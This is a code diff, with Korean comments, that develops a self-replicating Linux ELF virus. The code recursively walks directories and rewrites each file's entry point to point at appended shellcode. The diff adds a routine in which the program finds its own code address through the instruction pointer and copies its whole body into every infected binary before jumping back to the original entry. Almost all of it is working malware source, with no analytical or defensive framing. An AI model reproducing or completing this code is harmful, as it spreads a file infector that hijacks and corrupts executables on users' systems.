@@ -37,10 +37,9 @@ int my_strlen(const char *str);
 int my_ptraceme(long request, long pid, unsigned long addr, unsigned long data);
 int my_strcmp(char *str1, char *str2);
 void  *my_memset(void *b, int c, int len);
-void listdir(const char *dirname);
-void change_entrypoint(const char* fpath);
-int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW *s);
-
+void listdir(const char *dirname,long long int startrip);
+void change_entrypoint(const char* ,long long int startrip);
+static inline long long int hereis();
 
 int main(int argc, char* argv[])
 {
@@ -48,8 +47,21 @@ int main(int argc, char* argv[])
 	if(my_ptraceme(0,0,0,0)!=0) while(1);
 		
 	*/
+	
+	int startrip;
+	
+	// 48 8d 05 00 00 00 00	lea    0x0(%rip),%rax 
+	asm("lea (%rip), %rax");
+	
+	// 8d 00	lea    (%rax),%eax
+	asm("lea (%%rax), %0":"=r"(startrip)); // main + 22 를 리턴함 --> 대상에 write()할때 main+22부터 copy되도록 하기
+	
+	startrip = startrip - 22; //main의 시작 주소
+	// printf("main RIP is : 0x%x\n",startrip);
+	
+	
 	char dot[2]={'.',0};
-    listdir(dot);
+    listdir(dot,startrip);
 }
 
 
@@ -167,7 +179,7 @@ void  *my_memset(void *b, int c, int len){
   return(b);
 }
 
-void listdir(const char *dirname){
+void listdir(const char *dirname,long long int startrip){
     int nread = 0;
     int dirname_len = my_strlen(dirname);
     int d_name_len;
@@ -195,7 +207,7 @@ void listdir(const char *dirname){
 			my_memcpy(subfile + dirname_len, slash, 1);
 			my_memcpy(subfile + dirname_len + 1 ,d->d_name,d_name_len+1);
 			// here
-			change_entrypoint(subfile);
+			change_entrypoint(subfile,startrip);
 			
 			
 			if(d->d_ino && my_strcmp(d->d_name, dot) && my_strcmp(d->d_name, dotdot))
@@ -205,20 +217,21 @@ void listdir(const char *dirname){
 					my_memcpy(subdir, dirname, dirname_len);
 					my_memcpy(subdir + dirname_len, slash, 1);
 					my_memcpy(subdir + dirname_len + 1, d->d_name, d_name_len+1);
-					listdir(subdir);
+					listdir(subdir,startrip);
 				}
 			}
 		}
     }
 }
 
-void change_entrypoint(const char* fpath){
+void change_entrypoint(const char* fpath,long long int startrip){
 	char shellcode[0x1000];
 	int fd, i, shellcodeloc;
 	int is_infected_already = 1;  
 	int filesize;
 	long long int oep;
 	long long int oep_relocated;
+	long long int endrip;
 	Elf64_Shdr shdr;
 	Elf64_Phdr phdr;
 	Elf64_Ehdr ehdr;
@@ -259,7 +272,7 @@ void change_entrypoint(const char* fpath){
 	
 	oep = ehdr.e_entry;
 	ehdr.e_entry = shellcodeloc;
-	//printf("Original : 0x%x, Changed OEP : 0x%x\n",oep,shellcodeloc);
+	// printf("Original : 0x%x, Changed OEP : 0x%x\n",oep,shellcodeloc);
 	my_lseek(fd, 0, SEEK_SET);
 	my_write(fd, &ehdr, sizeof(ehdr));
 	
@@ -267,8 +280,7 @@ void change_entrypoint(const char* fpath){
 	/*---------------------------------------------------------------------------*/
 	// Malicious section 
 	
-	my_memset(shellcode,'\x90',0x1000);
-
+	
 	/*
 	  We use $RDI register to get relocation information. 
 	  $RDI holds base VA offset info!
@@ -282,6 +294,10 @@ void change_entrypoint(const char* fpath){
 	  *RDI  0x7ffff7ffe168 <— 0x0
 	*/
 	
+	
+	
+	/* -----------Save original entry point-------------*/
+	my_memset(shellcode,'\x90',0x1000);
 	/* 50	push   %rax    (원본rax저장. rax 가 init의 리턴값을지정해주나봄. 그래서망가지면안됨.) */
 	shellcode[0] = 0x50;
 	
@@ -298,42 +314,57 @@ void change_entrypoint(const char* fpath){
 	/* 50   push   %rax */
 	shellcode[14] = 0x50;  // 오리지널 엔트리 포인트를 동적으로 계산해서 쉘코드에 저장
 	
-	
-	/*
-	// 이 코드 이전으로 프로그램 시작까지의 오프셋을 구하기
-	my_lseek(fd,0,SEEK_END);  
+	my_lseek(fd,0,SEEK_END); 
 	my_write(fd,shellcode,20);
+	/*--------------------------------------------------*/
 	
 	
-	my_write(fd,1,1);//my_write(fd,현재코드의 시작주소,현재코드의 사이즈); 
-	// 현재 실행되는 EIP를 보고 EIP의 시작바이트부터 끝바이트까지를 복사?
-	// EIP를 얻기
-	// start = EIP - ???를 하기
-	// my_write(fd, start, size=10000정도?)를 붙여넣기
 	
-	// memcpy로 감염루틴 복사하면되지않음?
-	*/
 	
-	/*
-	// 파일의 끝
-	my_lseek(fd,0,SEEK_END);  
-	my_write(fd,shellcode,100);
-	*/
 	
+	/* --------write whole program until end -----------*/
+	// lseek 은 안해도되고
+	endrip = hereis() + 10;
+	my_write(fd, startrip, endrip - startrip); // TODO : printf 없애야겠다
+	/*--------------------------------------------------*/
+	
+	
+	
+	
+	
+	
+	/* --------- Go to Original Entry Point!------------*/
+	my_memset(shellcode,'\x90',0x1000);
 	
 	// 41 5e	pop    %r14 리턴주소꺼내기
-	shellcode[90] = '\x41';
-	shellcode[91] = '\x5e';
+	shellcode[0] = '\x41'; // 
+	shellcode[1] = '\x5e';
 	// 58	pop    %rax  rax꺼내기
-	shellcode[92] = '\x58';
+	shellcode[2] = '\x58';
 	// 41 ff e6	jmpq   *%r14
-	shellcode[93] = '\x41';
-	shellcode[94] = '\xff';
-	shellcode[95] = '\xe6';
+	shellcode[3] = '\x41';
+	shellcode[4] = '\xff';
+	shellcode[5] = '\xe6';
 	
 	// 파일의 끝
 	my_lseek(fd,0,SEEK_END);  
-	my_write(fd,shellcode,0x1000);
-	
-	
+	my_write(fd,shellcode,0x10);
+	/* ----------------------------------------------- */	
+
 }
+static inline long long int hereis(){ 
+	 /*
+       Dump of assembler code for function hereis:
+       0x000000000040054d <+0>:	55	push   %rbp
+       0x000000000040054e <+1>:	48 89 e5	mov    %rsp,%rbp
+       0x0000000000400551 <+4>:	48 8d 05 00 00 00 00	lea    0x0(%rip),%rax        # 0x400558 <hereis+11>
+       0x0000000000400558 <+11>:	48 89 45 f8	mov    %rax,-0x8(%rbp)
+       0x000000000040055c <+15>:	48 8b 45 f8	mov    -0x8(%rbp),%rax
+       0x0000000000400560 <+19>:	5d	pop    %rbp
+       0x0000000000400561 <+20>:	c3	retq   
+	 */
+	 long long int ret; // hereis + 11 (gcc flag : -fno-stack-protector) 
+	                    // Hence, end of virus routine is .... hereis - 11 + 21 == hereis + 10
+	 asm("lea (%%rip), %0":"=r"(ret));  
+	 return ret;
+ }
